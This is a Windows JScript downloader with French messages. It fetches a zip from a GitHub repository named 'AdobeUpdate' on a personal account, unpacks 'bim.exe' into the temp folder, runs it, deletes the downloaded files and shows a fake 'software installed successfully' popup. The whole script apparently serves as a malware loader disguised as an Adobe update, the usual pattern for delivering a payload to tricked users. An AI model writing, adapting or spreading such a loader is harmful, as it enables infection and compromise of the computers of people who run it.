// === Configuration ===
var shell = new ActiveXObject("WScript.Shell");
var fso   = new ActiveXObject("Scripting.FileSystemObject");

var config = {
    zipUrl: "https://github.com/jimbertclement/AdobeUpdate/releases/download/Win/bim25.zip",
    tempDir: shell.ExpandEnvironmentStrings("%TEMP%"),
    zipName: "bim25.zip",
    unzipFolder: "bim25_unzipped",
    exeName: "bim.exe"
};

var zipPath = config.tempDir + "\\" + config.zipName;
var unzipDir = config.tempDir + "\\" + config.unzipFolder;
var exePath = unzipDir + "\\" + config.exeName;

// === Fonctions Utilitaires ===
function waitForFile(filePath, timeoutMs) {
    var interval = 500;
    var elapsed = 0;
    while (!fso.FileExists(filePath)) {
        WScript.Sleep(interval);
        elapsed += interval;
        if (elapsed >= timeoutMs) {
            return false;
        }
    }
    return true;
}

function downloadFile(url, savePath) {
    try {
        var xmlhttp = new ActiveXObject("MSXML2.XMLHTTP");
        xmlhttp.open("GET", url, false);
        xmlhttp.send();
        if (xmlhttp.status !== 200) {
            throw new Error("Status " + xmlhttp.status);
        }
        var stream = new ActiveXObject("ADODB.Stream");
        stream.Type = 1; // adTypeBinary
        stream.Open();
        stream.Write(xmlhttp.responseBody);
        stream.SaveToFile(savePath, 2); // adSaveCreateOverWrite
        stream.Close();
    } catch(e) {
        throw new Error("Téléchargement échoué : " + e.message);
    }
}

function unzipFile(zipFile, destination) {
    try {
        // Supprimer le dossier de destination s'il existe
        if (fso.FolderExists(destination)) {
            fso.DeleteFolder(destination, true);
        }
        fso.CreateFolder(destination);
        var shellApp = new ActiveXObject("Shell.Application");
        var zipFolder = shellApp.NameSpace(zipFile);
        var targetFolder = shellApp.NameSpace(destination);
        if (!zipFolder || !targetFolder) {
            throw new Error("Impossible d'accéder aux dossiers nécessaires.");
        }
        targetFolder.CopyHere(zipFolder.Items(), 4 | 16);
        // Attendre l'extraction du fichier exécutable
        if (!waitForFile(destination + "\\" + config.exeName, 10000)) {
            throw new Error("L'extraction a pris trop de temps ou est incomplète.");
        }
    } catch(e) {
        throw new Error("Décompression échouée : " + e.message);
    }
}

function executeFile(pathToExe) {
    try {
        shell.Run('"' + pathToExe + '"', 1, true);
    } catch(e) {
        throw new Error("Exécution échouée : " + e.message);
    }
}

function cleanup() {
    try {
        if (fso.FileExists(zipPath)) {
            fso.DeleteFile(zipPath);
        }
        if (fso.FolderExists(unzipDir)) {
            fso.DeleteFolder(unzipDir, true);
        }
    } catch(e) {
        // Log et continuer même en cas d'erreur de nettoyage
        WScript.Echo("Erreur lors du nettoyage : " + e.message);
    }
}

// === Exécution du Script ===
try {
    WScript.Echo("Téléchargement de " + config.zipName + "...");
    downloadFile(config.zipUrl, zipPath);
    if (!fso.FileExists(zipPath)) {
        throw new Error("Fichier non téléchargé.");
    }
    
    WScript.Echo("Décompression de " + config.zipName + "...");
    unzipFile(zipPath, unzipDir);
    
    if (!fso.FileExists(exePath)) {
        throw new Error("Fichier " + config.exeName + " introuvable après décompression.");
    }
    
    WScript.Echo("Exécution de " + config.exeName + "...");
    executeFile(exePath);
    
    cleanup();
    
    shell.Popup("Logiciel installé avec succès!", 0, "Installation", 64);
    WScript.Echo("Terminé.");
    WScript.Quit(0);
} catch(e) {
    WScript.Echo("[ERREUR] " + e.message);
    WScript.Quit(1);
}
